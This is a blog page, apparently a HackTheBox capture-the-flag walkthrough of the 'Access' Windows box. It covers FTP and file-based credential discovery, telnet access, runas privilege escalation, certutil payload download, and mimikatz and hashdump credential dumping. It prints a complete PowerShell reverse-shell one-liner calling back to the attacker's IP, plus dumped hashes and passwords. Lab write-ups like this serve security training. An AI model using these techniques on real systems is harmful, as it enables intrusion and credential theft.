@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>HackTheBox - ACCESS WT - </title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Kad3cl" /><meta name="description" content="Box IP: 10.10.10.98 Reconnaissance 1) I started with scanning network. Here&amp;rsquo;s what I found
+PORT STATE SERVICE VERSION
+   21/tcp open ftp Microsoft ftpd     23/tcp open telnet?   80/tcp open http Microsoft IIS httpd 7.5    2) Port 80, we have a picture of a server room, &amp;ldquo;out.jpg&amp;rdquo; .. saved that for later
+I ran the out.jpg in stegsolve, maybe there was a hidden htb flag inside, but there was nothing and even with strings and binwalk they showed nothing interesting so I moved on to the ftp service." />
+
+
+<meta name="robots" content="">
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0 with even 4.0.0" />
+
+
+<link rel="canonical" href="/post/hackthebox-access-wt/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.58b28b82.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="HackTheBox - ACCESS WT" />
+<meta property="og:description" content="Box IP: 10.10.10.98 Reconnaissance 1) I started with scanning network. Here&rsquo;s what I found
+PORT STATE SERVICE VERSION
+   21/tcp open ftp Microsoft ftpd     23/tcp open telnet?   80/tcp open http Microsoft IIS httpd 7.5    2) Port 80, we have a picture of a server room, &ldquo;out.jpg&rdquo; .. saved that for later
+I ran the out.jpg in stegsolve, maybe there was a hidden htb flag inside, but there was nothing and even with strings and binwalk they showed nothing interesting so I moved on to the ftp service." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/hackthebox-access-wt/" />
+<meta property="article:published_time" content="2019-02-03T20:50:01-05:00" />
+<meta property="article:modified_time" content="2019-02-03T20:50:01-05:00" />
+<meta itemprop="name" content="HackTheBox - ACCESS WT">
+<meta itemprop="description" content="Box IP: 10.10.10.98 Reconnaissance 1) I started with scanning network. Here&rsquo;s what I found
+PORT STATE SERVICE VERSION
+   21/tcp open ftp Microsoft ftpd     23/tcp open telnet?   80/tcp open http Microsoft IIS httpd 7.5    2) Port 80, we have a picture of a server room, &ldquo;out.jpg&rdquo; .. saved that for later
+I ran the out.jpg in stegsolve, maybe there was a hidden htb flag inside, but there was nothing and even with strings and binwalk they showed nothing interesting so I moved on to the ftp service.">
+
+
+<meta itemprop="datePublished" content="2019-02-03T20:50:01-05:00" />
+<meta itemprop="dateModified" content="2019-02-03T20:50:01-05:00" />
+<meta itemprop="wordCount" content="1200">
+
+
+
+<meta itemprop="keywords" content="hackthebox,htb," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox - ACCESS WT"/>
+<meta name="twitter:description" content="Box IP: 10.10.10.98 Reconnaissance 1) I started with scanning network. Here&rsquo;s what I found
+PORT STATE SERVICE VERSION
+   21/tcp open ftp Microsoft ftpd     23/tcp open telnet?   80/tcp open http Microsoft IIS httpd 7.5    2) Port 80, we have a picture of a server room, &ldquo;out.jpg&rdquo; .. saved that for later
+I ran the out.jpg in stegsolve, maybe there was a hidden htb flag inside, but there was nothing and even with strings and binwalk they showed nothing interesting so I moved on to the ftp service."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">KAD3CL</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">KAD3CL</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">HackTheBox - ACCESS WT</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-02-03 </span>
+        
+          <span class="more-meta"> 1200 words </span>
+          <span class="more-meta"> 6 mins read </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#box-ip-10-10-10-98">Box IP: 10.10.10.98</a></li>
+</ul></li>
+<li><a href="#reconnaissance">Reconnaissance</a></li>
+<li><a href="#scanning">Scanning</a></li>
+<li><a href="#exploit">Exploit</a>
+<ul>
+<li><a href="#wdigest-credentials">wdigest credentials</a></li>
+</ul></li>
+<li><a href="#post-exploit">Post-Exploit</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h2 id="box-ip-10-10-10-98">Box IP: 10.10.10.98</h2>
+
+<h1 id="reconnaissance">Reconnaissance</h1>
+
+<p>1) I started with scanning network. Here&rsquo;s what I found</p>
+
+<p>PORT   STATE SERVICE VERSION</p>
+
+<table>
+<thead>
+<tr>
+<th>21/tcp open</th>
+<th>ftp     Microsoft ftpd</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>23/tcp open</td>
+<td>telnet?</td>
+</tr>
+
+<tr>
+<td>80/tcp open</td>
+<td>http    Microsoft IIS httpd 7.5</td>
+</tr>
+</tbody>
+</table>
+
+<p>2) Port 80,  we have a picture of a server room, <strong>&ldquo;out.jpg&rdquo;</strong> .. saved that for later</p>
+
+<p><img src="/images/htb-Access/1.png" alt="alt text" title="port 80" /></p>
+
+<p>I ran the out.jpg in stegsolve, maybe there was a hidden htb flag inside, but there was nothing and even with strings and binwalk they showed nothing interesting so I moved on to the ftp service.</p>
+
+<p>3) launched FileZilla on the 10.10.10.98 and I was connected as anonymous. There were two folders on root <strong>Backup</strong> which had an mbd file type in it and on the root there was also a folder called <strong>Engineers</strong>  which had a password protected zip file</p>
+
+<p><img src="/images/htb-Access/ftp results.png" alt="alt text" /></p>
+
+<p>4) I tried brute-forcing with fcrackzip but it was taking forever and I quit&hellip; I searched in the backup.mbd file using a mbd tool to view the content of db with the table
+    flag</p>
+
+<p><img src="/images/htb-Access/backup-mdb-table.png" alt="alt text" /></p>
+
+<p>5)  I found some interesting records in the backup.mbd. You can use the export flag to view any record.. After trying all of them.</p>
+
+<p>To export all records from table
+<strong><code>mdb-tables -d ',' backup.mdb | xargs -L1 -d',' -I{} bash -c 'mdb-export backup.mdb &quot;$1&quot; &gt;&quot;$1&quot;.csv' -- {}</code></strong></p>
+
+<p>Some had nothing in them. The  interesting one was the <strong>auth user record</strong></p>
+
+<p><img src="/images/htb-Access/backup-mdb-export.png" alt="alt text" /></p>
+
+<p>6)  We see some usernames and their passwords in the auth-user record.. I used the most obvious one as the password for the zip file and aaaand, it worked. it was the <strong>access4u@security</strong>. I also used those usernames with their corresponding passwords in the ftp hoping one of them was a privileged user but none worked.</p>
+
+<p><img src="/images/htb-Access/engineer-access-control-zip-extracted.png" alt="alt text" /></p>
+
+<p>7)  Now I have an <strong>Access Control.pst</strong> file. its size is 256K.. Checking the file type, it is a Ms outlook email file. so I imported it into  evolution to  open it and see what was inside</p>
+
+<p><img src="/images/htb-Access/access-control-pst-outlook.png" alt="alt text" /></p>
+
+<p>8)  After importing Access Control.pst into evolution. I got a nice present. An email sent from user @megacorp to the security access control system with password  in plaintext for an account “security” and password <strong>4Cc3ssC0ntr0ller</strong></p>
+
+<p><img src="/images/htb-Access/evolution-access-control-pst.png" alt="alt text" /></p>
+
+<p>9)  I tried using the credentials in the email in ftp to see maybe it would connect me to some more directories but that did not work. then I remembered the 23 port (Telnet) was open.</p>
+
+<h1 id="scanning">Scanning</h1>
+
+<p>We are in. Now it&rsquo;s time to enumerate this box&hellip;Some Windows cmds would definitely come in handy here. There are a lot more windows boxes out there than Linux in the real world. Hence, Why I am practicing windows on this box :)</p>
+
+<p><img src="/images/htb-Access/security-telnet-login.png" alt="alt text" /></p>
+
+<p>10)  I tried to get a meterpreter shell to make my life easier but I failed to get that working with <strong><code>session -u (Telnet Shell ID)</code></strong>&hellip; I will stick with the terminal shell :/</p>
+
+<p><img src="/images/htb-Access/telnet-meterpreter-shell-session-upgrade-u.png" alt="alt text" /></p>
+
+<p>11) I retrieved the user.txt hash on Desktop. Great!! Root I am comming for you :D</p>
+
+<p><img src="/images/htb-Access/security-user-txt.png" alt="alt text" /></p>
+
+<p>12)  Enumerating around.. there was not much in the security directory and not much luck with accessing administrator dir c:\users\administrator directory as current user. I found a hint in Public directory on desktop</p>
+
+<p><img src="/images/htb-Access/enumerating-public-desktop-lnk.png" alt="alt text" /></p>
+
+<p><img src="/images/htb-Access/runas-ZAccess-lnk.png" alt="alt text" /></p>
+
+<p>The <strong>&ldquo;runas”</strong> command is used to run commands as other users on windows. With this, we can run commands as an administrator aka  Window&rsquo;s Run as an administrator</p>
+
+<p>13) I found I can run powershell on box and I thought I managed spawn a powershell reverse shell with runas. Here were my steps,</p>
+
+<h1 id="exploit">Exploit</h1>
+
+<p>I setup a listening port on 10.10.12.109:413  to run in the background (exploit -j) in metasploit</p>
+
+<p><img src="/images/htb-Access/meterpreter-listener-powershell.png" alt="alt text" /></p>
+
+<p>Script for prompting a shell in powershell &ndash;&gt; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>
+There&rsquo;s also a one-liner command that you can type with &gt;runas /savedcred /user:access\administrator “powershell oneliner command”</p>
+
+<p>However that didn&rsquo;t work for me. I ended up using this script (<a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4">https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4</a>) change  <strong>$socket</strong> variable with your listening IP.</p>
+
+<p>On the target machine in  telnet
+I used windows “copy con r.ps1” to create an PowerShell file. named r. I pasted script then  CTRL-z then Enter to save it and exit</p>
+
+<p>My session was interrupted in this session. I opened another telnet session and repeated the same steps.</p>
+
+<p>14) To execute the script  “powershell -command .\r.ps1”  however, It didn&rsquo;t work. I got an error basically it said I cannot run Powershell scripts on the machine.</p>
+
+<p><img src="/images/htb-Access/cannot-load-exec-powershell-script.png" alt="alt text" /></p>
+
+<p>However, I found a way to disable it on windows via cmd using  runas.exe  /savecred  /user:Access\Administrator  to run it.</p>
+
+<p><strong><code>runas /savecred /user:access\Administrator &quot;powershell Set-ExecutionPolicy RemoteSigned&quot;</code></strong> and that took care of it. Re-running the Powershell -command .\r.ps1  and it worked</p>
+
+<p><img src="/images/htb-Access/meterpreter-half-establised-powershell.png" alt="alt text" /></p>
+
+<p>This also works</p>
+
+<p>paste it in .ps1 file on target</p>
+
+<blockquote>
+<p>$client = New-Object System.Net.Sockets.TCPClient(&ldquo;10.10.12.109&rdquo;,413);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &ldquo;PS &rdquo; + (pwd).Path + &ldquo;&gt; &ldquo;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</p>
+</blockquote>
+
+<p>My happiness was slammed in the face when I realized that this was not a fully established shell. none of the commands like &ldquo;load&rdquo; “shell&rdquo; or “ls” worked through meterpreter and it was an incomplete connection.</p>
+
+<p><img src="/images/htb-Access/meterpreter-halfestablished-powershell.png" alt="alt text" /></p>
+
+<p>15)  I looked for another way, I found CertUtil.exe was not blocked and  can be used to download a payload and get a reverse shell.  I generated the payload</p>
+
+<p><img src="/images/htb-Access/paylaod-msfvenom-create.png" alt="alt text" /></p>
+
+<p>then ran a temporary webserver with simpleHTTPserver on the directory where notepad.exe (payload I created) was. If I check localhost. It shows the directory</p>
+
+<p><img src="/images/htb-Access/simpleHttp-python-command.png" alt="alt text" /></p>
+
+<p><img src="/images/htb-Access/simpleHttp-local-webserver.png" alt="alt text" /></p>
+
+<p>16) I have a reverse listener running on port 23 with my IP as RHOST. In telent session on target, I ran certutil to download the payload</p>
+
+<p><img src="/images/htb-Access/certutil-runas-exec-notepad.png" alt="alt text" /></p>
+
+<p>It worked. now we have notepad.exe downloaded on the target machine and I used runas to run it as an admin. If you tried to run notepad.exe without runas you will get a blocked policy cannot do that message. Voila  now I got a fully established  meterpreter shell this time</p>
+
+<p><img src="/images/htb-Access/certutil-successful-meterpreter.png" alt="alt text" /></p>
+
+<p>backgrounded  meterpreter session to use hashdump module and get hashes of Admin. You need to run getsystem first before “run hashdump”</p>
+
+<p><img src="/images/htb-Access/hashdump-acquired.png" alt="alt text" /></p>
+
+<blockquote>
+<p><strong>Administrator:500:aad3b435b51404eeaad3b435b51404ee:db852e5a46ea5f5514f639a20daa9e2c:::</strong>
+<strong>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</strong>
+<strong>security:1001:aad3b435b51404eeaad3b435b51404ee:b41db16a61cb04b231625de260163015:::</strong>
+<strong>engineer:1002:aad3b435b51404eeaad3b435b51404ee:25c41637f0a9874ac9b90b4a4baf5783:::</strong></p>
+</blockquote>
+
+<p>while waiting for jripper to crack the hash. I loaded mimikatz and got the admin&rsquo;s password</p>
+
+<p><img src="/images/htb-Access/mimkikatz-admin-creds.png" alt="alt text" /></p>
+
+<h2 id="wdigest-credentials">wdigest credentials</h2>
+
+<p>AuthID     Package    Domain        User                Password
+&mdash;&mdash;     &mdash;&mdash;-    &mdash;&mdash;        &mdash;-              | &mdash;&mdash;&ndash;
+0;996    |  Negotiate |  HTB         |  ACCESS$
+0;119773 |  Negotiate |  IIS APPPOOL |  DefaultAppPool|
+0;995    |  Negotiate |  NT AUTHORITY|  IUSR
+0;997    |  Negotiate |  NT AUTHORITY|  LOCAL SERVICE
+0;45589  |  NTLM
+0;999    |  NTLM      |  HTB         |  ACCESS$
+0;458676 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
+0;456008 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
+0;646488 |  NTLM      |  ACCESS      |  Administrator |  55Acc3ssS3cur1ty@megacorp</p>
+
+<h1 id="post-exploit">Post-Exploit</h1>
+
+<p>Next, I opened a telnet session and logged in with admin password</p>
+
+<p>DONE</p>
+
+<p>I Opened 445 via admin to open a meterpreter shell via psexec
+netsh advfirewall firewall add rule dir=in action=allow protocol=TCP localport=445 name=&ldquo;allow_TCP-445&rdquo;</p>
+
+<p><img src="/images/htb-Access/opened-smb-port.png" alt="alt text" /></p>
+
+<p>I also opened 3389 just to see if rdesktop would work..it didn&rsquo;t!</p>
+
+<hr />
+
+<p>I wanted to upload my own jpg on webserver instead of the default jpeg. Looking in websrc</p>
+
+<p><img src="/images/htb-Access/webserver-src-pg.png" alt="alt text" /></p>
+
+<blockquote>
+<p>C:\inetpub\wwwroot\out.jpg</p>
+</blockquote>
+
+<p>Oh yeh, this is fun. So after uploading a “hack the planet&rdquo; jpg file on the target machine using the certutil trick and priv esca with getsystem. Popping a shell through meterpreter. I copied my htP.jpg into the inetpub folder replacing the existing out.jpg with mine</p>
+
+<p><img src="/images/htb-Access/uploading-hack-the-planet.png" alt="alt text" /></p>
+
+<p><img src="/images/htb-Access/target-machine-hack-the-planet.png" alt="alt text" /></p>
+
+<p>That&rsquo;s it folks until the next box !!</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">
+      <a href="">Kad3cl</a>
+    </span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title"></span>
+    <span class="item-content">
+        2019-02-03
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title"></span>
+    <span class="item-content">
+        <a href="/post/hackthebox-access-wt/">/post/hackthebox-access-wt/</a>
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/hackthebox/">hackthebox</a>
+          <a href="/tags/htb/">htb</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/hackthebox-netmon/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">HackTheBox - Netmon WT</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="http://localhost:1313" class="iconfont icon-github" title="github"></a>
+  <a href="/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+     - 
+    2019
+    <span class="heart">
+<style>.heart{color:#e25555;}</style>
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">kad3cl</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  <script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
